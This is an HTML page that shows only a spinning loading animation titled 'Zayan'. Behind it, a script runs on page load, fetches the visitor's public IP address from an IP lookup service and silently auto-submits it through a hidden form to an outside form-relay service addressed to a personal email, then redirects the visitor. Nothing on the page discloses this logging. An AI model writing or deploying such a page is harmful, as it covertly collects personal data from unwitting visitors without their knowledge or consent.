<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Zayan</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background: #0d0d0d;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      font-family: sans-serif;
    }

    .spinner {
      position: relative;
      width: 120px;
      height: 120px;
      animation: rotate 3s linear infinite;
    }

    .spinner img {
      width: 100%;
      height: 100%;
      border-radius: 50%;
    }

    .dot {
      position: absolute;
      width: 10px;
      height: 10px;
      background: #0ff;
      border-radius: 50%;
      animation: orbit 3s linear infinite;
    }

    .dot:nth-child(2) { animation-delay: 0.2s; }
    .dot:nth-child(3) { animation-delay: 0.4s; }
    .dot:nth-child(4) { animation-delay: 0.6s; }

    @keyframes orbit {
      0% { transform: rotate(0deg) translateX(60px); }
      100% { transform: rotate(360deg) translateX(60px); }
    }

    @keyframes rotate {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="spinner">
    <!-- Replace with Zayan.png -->
    <img src="zayan.png" alt="Loading">
    <div class="dot"></div>
    <div class="dot"></div>
    <div class="dot"></div>
    <div class="dot"></div>
  </div>

  <form id="logForm" action="https://formsubmit.co/zayanm794@gmail.com" method="POST">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_template" value="table">
    <input type="hidden" name="_next" value="index.html">
    <input type="hidden" name="IP Address" id="ipField">
  </form>

  <script>
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        document.getElementById("ipField").value = data.ip;
        document.getElementById("logForm").submit();
      });
  </script>
</body>
</html>
